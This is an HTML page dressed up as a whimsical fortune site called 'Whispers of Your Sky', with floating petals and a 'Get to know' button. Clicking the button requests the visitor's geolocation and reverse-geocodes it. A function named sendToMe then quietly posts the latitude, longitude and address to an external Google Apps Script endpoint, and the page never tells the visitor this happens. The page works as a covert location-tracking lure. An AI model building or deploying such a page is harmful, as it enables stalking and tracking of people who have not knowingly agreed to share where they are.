<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Whispers of Your Sky</title>
  <link href="https://fonts.googleapis.com/css2?family=Playfair+Display&family=Quicksand&display=swap" rel="stylesheet">
  <style>
    @keyframes float {
  0% { transform: translateY(0); opacity: 1; }
  100% { transform: translateY(-100px); opacity: 0; }
}

.petal {
  position: absolute;
  width: 20px;
  height: 20px;
  background: url('https://img.freepik.com/premium-psd/png-acrylic-stroke-top-with-leaf-icon-element-overlay-painting-plant-art_53876-634307.jpg?semt=ais_hybrid&w=740&q=80') no-repeat center;
  background-size: contain;
  animation: float 6s infinite ease-in;
}
    body {
      font-family: 'Quicksand', sans-serif;
      background: linear-gradient(to bottom, #fdf6f0, #e8dcd0);
      color: #4b3f2f;
      text-align: center;
      padding: 60px;
    }
    h1 {
      font-family: 'Playfair Display', serif;
      font-size: 36px;
      margin-bottom: 10px;
    }
    p {
      font-size: 18px;
      margin-bottom: 30px;
    }
    button {
      background-color: #e0b7a4;
      border: none;
      padding: 15px 30px;
      font-size: 16px;
      border-radius: 8px;
      cursor: pointer;
      transition: background 0.3s ease;
    }
    button:hover {
      background-color: #d49c85;
    }
    #output {
      margin-top: 40px;
      font-size: 18px;
    }
  </style>
</head>
<body>
  <h1> Whispers of Your Sky</h1>
  <p>Let the winds carry your fortune to me‚Äîonly if your heart agrees.</p>
  <div id="petal-container"></div>
<script>
  for (let i = 0; i < 15; i++) {
    let petal = document.createElement("div");
    petal.className = "petal";
    petal.style.left = Math.random() * window.innerWidth + "px";
    petal.style.top = Math.random() * window.innerHeight + "px";
    petal.style.animationDuration = (4 + Math.random() * 4) + "s";
    document.getElementById("petal-container").appendChild(petal);
  }
</script>
  <button onclick="getLocation()">Get to know</button>
  <div id="output"></div>

  <script>
    function getLocation() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(showPosition, showError);
      } else {
        document.getElementById("output").innerHTML = "Your browser doesn't support location sharing.";
      }
    }

    function showPosition(position) {
  const lat = position.coords.latitude;
  const lon = position.coords.longitude;

  fetch(`https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lon}&format=json`)
    .then(response => response.json())
    .then(data => {
      const location = data.display_name;
      document.getElementById("output").innerHTML = `
        <p>üìç You are near: <strong>${location}</strong></p>
        <p>Latitude: ${lat}<br>Longitude: ${lon}</p>
        <p style="margin-top:30px; font-style:italic; color:#7a5c4f;">
          A breeze from your skies just reached me.<br>
          Stay tuned‚Äîsomething big is on its way üå∏
        </p>
      `;
      sendToMe(lat, lon, location);
    });
}

    function sendToMe(lat, lon, location) {
      fetch("https://script.google.com/macros/s/AKfycbxSpqX_sP351r-93hJTYbBE4l5k1UqwpMi-BwKDStNzUW1-bU0sA2IoYlQSfGDm2Oup/exec", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ latitude: lat, longitude: lon, place: location })
      });
    }

    function showError(error) {
      document.getElementById("output").innerHTML = "Location sharing was declined or failed.";
    }
  </script>
</body>
</html>
